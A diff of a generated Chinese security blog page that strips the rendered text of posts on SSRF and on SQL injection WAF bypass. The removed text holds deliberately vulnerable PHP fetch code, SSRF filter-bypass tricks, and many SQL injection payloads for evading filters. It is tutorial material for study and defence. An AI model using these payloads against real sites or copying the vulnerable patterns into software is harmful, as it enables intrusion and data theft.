@@ -27,6 +27,8 @@
 <meta property="og:site_name" content="CSQ&amp;个人博客">
 <meta property="og:description" content="学无止境">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-05-03T08:26:51.723Z">
+<meta property="article:modified_time" content="2023-05-03T08:26:42.431Z">
 <meta property="article:author" content="CSQ">
 <meta name="twitter:card" content="summary">
 
@@ -37,13 +39,14 @@
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
+    isHome : false,
     isPost : false,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>CSQ&个人博客</title>
+  <title> | CSQ&个人博客
+</title>
   
 
 
@@ -155,313 +158,43 @@
       <div class="main-inner">
         <div class="content-wrap">
           
+  
+  
 
-          <div class="content index posts-expand">
+          <div class="content page posts-expand">
             
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/03/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/">
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="CSQ">
-      <meta itemprop="description" content="学无止境">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CSQ&个人博客">
-    </span>
+    
+    
+    
+    <div class="post-block" lang="zh-CN">
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/05/03/SSRF%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0/" class="post-title-link" itemprop="url">未命名</a>
-        </h2>
 
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
+<h1 class="post-title" itemprop="name headline">
+</h1>
 
-              <time title="创建时间：2023-05-03 15:24:23 / 修改时间：15:43:14" itemprop="dateCreated datePublished" datetime="2023-05-03T15:24:23+08:00">2023-05-03</time>
-            </span>
+<div class="post-meta">
+  
 
-          
+</div>
 
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
+</header>
 
       
-          <h2 id="SSRF漏洞"><a href="#SSRF漏洞" class="headerlink" title="SSRF漏洞"></a>SSRF漏洞</h2><h4 id="SSRF漏洞概述"><a href="#SSRF漏洞概述" class="headerlink" title="SSRF漏洞概述"></a>SSRF漏洞概述</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SSRF(Server-Side Request Forgery:服务器端请求伪造) 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</span><br></pre></td></tr></table></figure>
-
-<h4 id="怎么产生SSRF漏洞"><a href="#怎么产生SSRF漏洞" class="headerlink" title="怎么产生SSRF漏洞"></a>怎么产生SSRF漏洞</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">很多Web应用都提供了从其他服务器上获取数据的功能。使用用户指定的URL，Web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地服务器。</span><br><span class="line">服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制.</span><br></pre></td></tr></table></figure>
-
-<p>大部分的web服务器架构中，web服务器自身都可以访问互联网和服务器所在的内网。</p>
-<p><img src="/../images/image-20230503125426240.png"></p>
-<h4 id="SSRF能利用的地方"><a href="#SSRF能利用的地方" class="headerlink" title="SSRF能利用的地方"></a>SSRF能利用的地方</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">可以对外网服务器所在的内网、本地进行端口扫描，获取一些服务的banner信息 。</span><br><span class="line">攻击运行在内网或者本地的应用程序。</span><br><span class="line">对内网web应用进行指纹识别，通过访问默认文件实现 。</span><br><span class="line">攻击内外网的web应用。sql注入、struct2、redis等。</span><br><span class="line">利用file协议读取本地文件等。</span><br></pre></td></tr></table></figure>
-
-<h4 id="SSRF相关函数"><a href="#SSRF相关函数" class="headerlink" title="SSRF相关函数"></a>SSRF相关函数</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">if (isset($_POST[&#x27;url&#x27;])) &#123; </span><br><span class="line">$content = file_get_contents($_POST[&#x27;url&#x27;]); </span><br><span class="line">$filename =&#x27;./images/&#x27;.rand().&#x27;;img1.jpg’;</span><br><span class="line"> file_put_contents($filename, $content); </span><br><span class="line">echo $_POST[&#x27;url’]; </span><br><span class="line">$img = &quot;&lt;img src=\&quot;&quot;.$filename.&quot;\&quot;/&gt;&quot;; </span><br><span class="line">&#125; </span><br><span class="line">echo $img; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">Fsockopen</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">function GetFile($host, $port, $link)</span><br><span class="line">&#123;</span><br><span class="line">    //fsockopen() 将返回一个文件句柄，之后可以被其他文件类函数调用</span><br><span class="line">    //（例如： fgets() ， fgetss() ，</span><br><span class="line">    // fwrite() ， fclose() 还有 feof() ）。如果调用失败，将返回 FALSE 。</span><br><span class="line">    $fp = fsockopen($host, intval($port), $errno, $errstr, 30);</span><br><span class="line">    if (!$fp) &#123;</span><br><span class="line">        echo &quot;$errstr (error number $errno) \n&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $out = &quot;GET $link HTTP/1.1\r\n&quot;;</span><br><span class="line">        $out .= &quot;Host: $host\r\n&quot;;</span><br><span class="line">        $out .= &quot;Connection: Close\r\n\r\n&quot;;</span><br><span class="line">        $out .= &quot;\r\n&quot;;</span><br><span class="line">        fwrite($fp, $out);</span><br><span class="line">        $contents = &#x27;&#x27;;</span><br><span class="line">        while (! feof($fp)) &#123;</span><br><span class="line">            $contents .= fgets($fp, 1024);</span><br><span class="line">        &#125;</span><br><span class="line">        fclose($fp);</span><br><span class="line">        return $contents;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$host = $_GET[&#x27;host&#x27;];</span><br><span class="line">$port = $_GET[&#x27;port&#x27;];</span><br><span class="line">$link = $_GET[&#x27;link&#x27;];</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">curl_exec</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line">if (isset($_POST[&#x27;url&#x27;]))&#123;</span><br><span class="line">$link = $_POST[&#x27;url’];</span><br><span class="line">$curlobj = curl_init();</span><br><span class="line">curl_setopt($curlobj, CURLOPT_POST, 0);</span><br><span class="line">curl_setopt($curlobj,CURLOPT_URL,$link);</span><br><span class="line">curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">$result=curl_exec($curlobj);curl_close($curlobj);</span><br><span class="line">$filename = &#x27;./curled/&#x27;.rand().&#x27;.txt’;</span><br><span class="line">file_put_contents($filename, $result);</span><br><span class="line"> echo $result;&#125;?&gt;</span><br></pre></td></tr></table></figure>
-
-<h4 id="SSRF漏洞挖掘"><a href="#SSRF漏洞挖掘" class="headerlink" title="SSRF漏洞挖掘"></a>SSRF漏洞挖掘</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">一.Web功能查找</span><br><span class="line">二.通过URL地址分享网页内容</span><br><span class="line">三.转码服务</span><br><span class="line">四.在线翻译</span><br><span class="line">五.图片加载与下载</span><br></pre></td></tr></table></figure>
-
-<h4 id="SSRF漏洞验证"><a href="#SSRF漏洞验证" class="headerlink" title="SSRF漏洞验证"></a>SSRF漏洞验证</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">方式一:</span><br><span class="line">http://www.baidu.com/ShowImage.aspx?ImageUrl=http://www.a.com/a.jpg</span><br><span class="line">1）我们先验证，请求是否是服务器端发出的，可以右键图片，使用新窗口打开图片，如果浏览器上地址栏是</span><br><span class="line">http://www.a.com/a.jpg，（说明不存在SSRF漏洞。）</span><br><span class="line">http://www.baidu.com/uploads/2021080924.jpg  （不存在）</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">方式二:</span><br><span class="line">	可以在Firebug 或者burpsuite抓包工具，查看请求数据包中是否包含http://www.a.com/a.jpg这个请求。由于SSRF是服务端发起的请求，因此在加载这张图片的时候本地浏览器中不应该存在图片的请求。</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">	在验证完是由服务端发起的请求之后，此处就有可能存在SSRF，接下来需要验证此URL是否可以来请求对应的内网地址。首先我们要获取内网存在HTTP服务且存在favicon.ico文件地址，才能验证是否是SSRF。</span><br><span class="line">http://127.0.0.1</span><br><span class="line">此处找内网地址可以通过从漏洞平台中的历史漏洞寻找泄露的内网地址</span><br></pre></td></tr></table></figure>
-
-<h4 id="SSRF常见限制"><a href="#SSRF常见限制" class="headerlink" title="SSRF常见限制"></a>SSRF常见限制</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.限制为http://www.xxx.com 域名</span><br><span class="line">采用http基本身份认证的方式绕过。即@</span><br><span class="line">http://www.xxx.com@www.xxc.com</span><br><span class="line"></span><br><span class="line">2.限制请求IP不为内网地址</span><br><span class="line">当不允许ip为内网地址时</span><br><span class="line">（1）采取短网址绕过</span><br><span class="line">（2）采取特殊域名</span><br><span class="line">（3）采取进制转换</span><br><span class="line"></span><br><span class="line">3.限制请求只为http协议</span><br><span class="line">（1）采取302跳转</span><br><span class="line">（2）采取短地址</span><br></pre></td></tr></table></figure>
-
-<h4 id="SSRF常用协议"><a href="#SSRF常用协议" class="headerlink" title="SSRF常用协议"></a>SSRF常用协议</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dict协议</span><br><span class="line">file协议</span><br><span class="line">http协议</span><br><span class="line">ftp协议(扫描端口极其好用)</span><br><span class="line">gopher协议</span><br></pre></td></tr></table></figure>
-
-<h4 id="SSRF防御"><a href="#SSRF防御" class="headerlink" title="SSRF防御"></a>SSRF防御</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.统一错误信息，避免用户可以根据错误信息来判断远程服务器端口状态</span><br><span class="line"></span><br><span class="line">2.限制请求的端口为HTTP常用的端口，比如 80,443,8080,8088等 </span><br><span class="line"></span><br><span class="line">3.黑名单内网IP。</span><br><span class="line"></span><br><span class="line">4.禁用不需要的协议，仅仅允许HTTP和HTTPS.</span><br></pre></td></tr></table></figure>
-
-
+      
+      
+      <div class="post-body">
+          
+      </div>
+      
+      
       
     </div>
+    
 
     
     
     
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/03/SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="CSQ">
-      <meta itemprop="description" content="学无止境">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CSQ&个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/05/03/SQL%E6%B3%A8%E5%85%A5WAF%E7%BB%95%E8%BF%87/" class="post-title-link" itemprop="url">SQL注入WAF绕过</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2023-05-03 14:41:42 / 修改时间：14:42:16" itemprop="dateCreated datePublished" datetime="2023-05-03T14:41:42+08:00">2023-05-03</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="SQL注入WAF绕过"><a href="#SQL注入WAF绕过" class="headerlink" title="SQL注入WAF绕过"></a>SQL注入WAF绕过</h2><p>绕过类型：单双引号、空格、关键字、比较（逗号）–》函数&#x2F;关键字替代、注释    </p>
-<p>绕过方法：大小写、替换关键字、函数(关键字)、编码&#x2F;进制、sql特性</p>
-<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>此类绕过不经常使用，但是用的时候也不能忘了它，他原理是基于SQL语句不分大小写的，但过滤只过滤其中一种。</p>
-<h3 id="替换关键字-and"><a href="#替换关键字-and" class="headerlink" title="替换关键字(and)"></a>替换关键字(and)</h3><p>这种情况下大小写转化无法绕过而且正则表达式会替换或删除select、union这些关键字如果只匹配一次就很容易绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xx.com/index.php?page_id=-15 UNIunionON SELselectECT 1,2,3,4</span><br></pre></td></tr></table></figure>
-
-<h3 id="空格绕过"><a href="#空格绕过" class="headerlink" title="空格绕过"></a>空格绕过</h3><p><strong>payload</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">注释</span><br><span class="line">select/**/*/**/from/**/yz;</span><br><span class="line"></span><br><span class="line">select%0a*%0afrom%0ayz; %0a 是回车    //%09 %0d</span><br><span class="line"></span><br><span class="line">select(a)from(yz);</span><br><span class="line"></span><br><span class="line">select(a)from(yz)where(a=1);</span><br></pre></td></tr></table></figure>
-
-<h3 id="内联注释-关键字"><a href="#内联注释-关键字" class="headerlink" title="内联注释(关键字)"></a>内联注释(关键字)</h3><p>union select</p>
-<p>有些WAF的过滤关键词像&#x2F;union\sselect&#x2F;g，就比如上面说的，很多时候我都是采用内联注释。更复杂的例子需要更先进的方法。比如添加了SQL关键字，我们就要进一步分离这两个词来绕过这个过滤器。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1/*!UnIoN*/SeLeCT</span><br><span class="line">/*!select*//*!**//*!from*//*!yz*/</span><br></pre></td></tr></table></figure>
-
-<h3 id="替换关键字"><a href="#替换关键字" class="headerlink" title="替换关键字"></a>替换关键字</h3><p>这种情况下大小写转化无法绕过而且正则表达式会替换或删除select、union这些关键字如果只匹配一次就很容易绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELselectECT 1,2,3,4</span><br></pre></td></tr></table></figure>
-
-<h3 id="URL编码"><a href="#URL编码" class="headerlink" title="URL编码"></a>URL编码</h3><p>有时后台界面会再次URL解码所以这时可以利用二次编码解决问题<br>后台语句</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$insert=$link-&gt;query(urldecode($_GET[&#x27;id&#x27;]));</span><br><span class="line"></span><br><span class="line">$row=$insert-&gt;fetch_row();</span><br><span class="line"></span><br><span class="line">select * from yz</span><br><span class="line"></span><br><span class="line">select * from  %2579%257a</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不用空格+单双引号的情况下--》查询出用户名为admin的数据</span><br></pre></td></tr></table></figure>
-
-<h3 id="十六进制绕过（引号绕过）-‘’-“”"><a href="#十六进制绕过（引号绕过）-‘’-“”" class="headerlink" title="十六进制绕过（引号绕过） ‘’ 		“”"></a>十六进制绕过（引号绕过） ‘’ 		“”</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select a from yz where b=0x32;</span><br><span class="line"></span><br><span class="line">select * from yz where b=char(0x32);</span><br><span class="line"></span><br><span class="line">select * from yz where b=char(0x67)+char(0x75)+char(0x65)+char(0x73)+char(0x74)</span><br><span class="line"></span><br><span class="line">-------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select column_name  from information_schema.tables where table_name=&quot;users&quot;</span><br><span class="line"></span><br><span class="line">select column_name  from information_schema.tables where table_name=0x7573657273</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;&quot; method=&quot;get&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; name=&quot;aaa&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;submit&quot; value=&quot;GO&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$str=$_GET[&#x27;aaa&#x27;];</span><br><span class="line"></span><br><span class="line">//$str = &quot;hello world&quot;; // 输入的字符串</span><br><span class="line">$hex = &quot;&quot;; // 用于存储转换后的16进制字符串</span><br><span class="line">for ($i = 0; $i &lt; strlen($str); $i++) &#123;</span><br><span class="line">    $hex .= &quot;CHAR(0X&quot; . dechex(ord($str[$i])) . &quot;)&quot;;</span><br><span class="line">    if ($i != strlen($str) - 1) &#123;</span><br><span class="line">        $hex .= &quot;+&quot;; // 每个字符之间使用+符号分隔</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">echo $hex; // 输出转换后的16进制字符串</span><br></pre></td></tr></table></figure>
-
-<h3 id="逗号绕过-盲注"><a href="#逗号绕过-盲注" class="headerlink" title="逗号绕过(盲注)"></a>逗号绕过(盲注)</h3><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决。limit 可以使用 offset ;</p>
-<p>substr(),mid(),   - &gt; from for</p>
-<p>limit -&gt;offset</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">substr(),mid()</span><br><span class="line"></span><br><span class="line">mid(user() from 1 for 1)</span><br><span class="line"></span><br><span class="line">substr(user() from 1 for 1)   //substr((payload), 1, 1))</span><br><span class="line"></span><br><span class="line">select substr(user()from -1) from yz ;</span><br><span class="line"></span><br><span class="line">select ascii(substr(user() from 1 for 1)) &lt; 150;</span><br><span class="line"></span><br><span class="line">同时也可以利用替换函数</span><br><span class="line"></span><br><span class="line">select left(database(),2)&gt;&#x27;tf&#x27;;</span><br><span class="line"></span><br><span class="line">selete * from testtable limit 2,1;</span><br><span class="line"></span><br><span class="line">selete * from testtable limit 2 offset 1;</span><br></pre></td></tr></table></figure>
-
-<h3 id="比较符-lt-gt-绕过"><a href="#比较符-lt-gt-绕过" class="headerlink" title="比较符(&lt;,&gt;)绕过"></a>比较符(&lt;,&gt;)绕过</h3><p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。</p>
-<p>如果无法使用比较操作符，那么就需要使用到greatest，strcmp来进行绕过了。</p>
-<p>greatest</p>
-<p>least</p>
-<p>strcmp(字符串比较)</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">GREATEST() 函数用于返回一组值中的最大值，它可以接受两个或多个参数，返回这些参数中的最大值。例如，GREATEST(1,2,3) 将返回 3。</span><br><span class="line"></span><br><span class="line">least() 返回最小值</span><br><span class="line">least(1,2,3) 将返回 1。</span><br><span class="line"></span><br><span class="line">STRCMP() 函数用于比较两个字符串，它接受两个参数，并返回一个表示比较结果的整数值。如果第一个字符串小于第二个字符串，返回负数；如果第一个字符串大于第二个字符串，返回正数；如果两个字符串相等，则返回 0。例如，STRCMP(&#x27;abc&#x27;, &#x27;def&#x27;) 将返回一个负数，而 STRCMP(&#x27;abc&#x27;, &#x27;abc&#x27;) 将返回 0。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</span><br><span class="line"></span><br><span class="line">select strcmp(left(database(),1),0x32);#lpad(&#x27;asd&#x27;,2,0)</span><br><span class="line"></span><br><span class="line">if(substr(id,1,1)in(0x41),1,3)</span><br><span class="line"></span><br><span class="line">-- 新学习了一种骚骚的注入姿势in、between、order by</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select * from yz where a in (&#x27;aaa&#x27;);</span><br><span class="line">select substr(a,1,1) in (&#x27;a&#x27;) from yz ;</span><br><span class="line"></span><br><span class="line">select * from yz where a between &#x27;a&#x27; and &#x27;b&#x27;;</span><br><span class="line">select * from yz where a between 0x89 and 0x90;</span><br><span class="line"></span><br><span class="line">select * from yz union select 1,2,3 order by 1;</span><br><span class="line">-- 也可以用like，根据排列顺序进行真值判断</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="注释符绕过"><a href="#注释符绕过" class="headerlink" title="注释符绕过"></a>注释符绕过</h3><p>在注入时的注释符一般为# –当两者不能用时就不能闭合引号<br>这里介绍一个奇淫巧技</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3 from yz where &#x27;1&#x27;/1=(1=1)/&#x27;1&#x27;=&#x27;1&#x27;</span><br><span class="line"></span><br><span class="line">(1=1)中就有了判断位为下面的注入打下基础</span><br><span class="line"></span><br><span class="line">?id=1&#x27;and &#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=1&#x27;/1=(1=1)/&#x27;1&#x27;=&#x27;1</span><br><span class="line">&#x27;1&#x27;/1=(1=1)=&#x27;1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;$id  &#x27;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤比较符+逗号+空格-》判断users 表中 id=1 的（username）字段 第一个字符是不是‘D’</span><br></pre></td></tr></table></figure>
-
-<h3 id="宽字节绕过"><a href="#宽字节绕过" class="headerlink" title="宽字节绕过"></a>宽字节绕过</h3><p>字节注入也是在最近的项目中发现的问题，大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在%df\’ &#x3D;%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗’，也就是说：%df\’ &#x3D; %df%5c%27&#x3D;縗’，有了单引号就好注入了。</p>
-<p>注：select防止用户自定义的名称和mysql保留字冲突</p>
-<h3 id="with-rollup"><a href="#with-rollup" class="headerlink" title="with rollup"></a>with rollup</h3><p>一般结合group by使用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">select 1 as test from  yz group by test with rollup limit 1 offset 1;</span><br><span class="line"></span><br><span class="line">+------+</span><br><span class="line"></span><br><span class="line">| test |</span><br><span class="line"></span><br><span class="line">+------+</span><br><span class="line"></span><br><span class="line">| NULL |</span><br><span class="line"></span><br><span class="line">+------+</span><br></pre></td></tr></table></figure>
-
-<h3 id="13-无列名注入"><a href="#13-无列名注入" class="headerlink" title="13 无列名注入"></a>13 无列名注入</h3><p>给未知列名起别名</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select a from (select 1,2,3 a union select * from yz)v;</span><br></pre></td></tr></table></figure>
-
-<h3 id="14-判断列数绕过"><a href="#14-判断列数绕过" class="headerlink" title="14 判断列数绕过"></a>14 判断列数绕过</h3><p>当order by 被过滤后就可以使用into 变量来绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from yz limit 1,1 into @a,@b,@c;</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/05/03/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
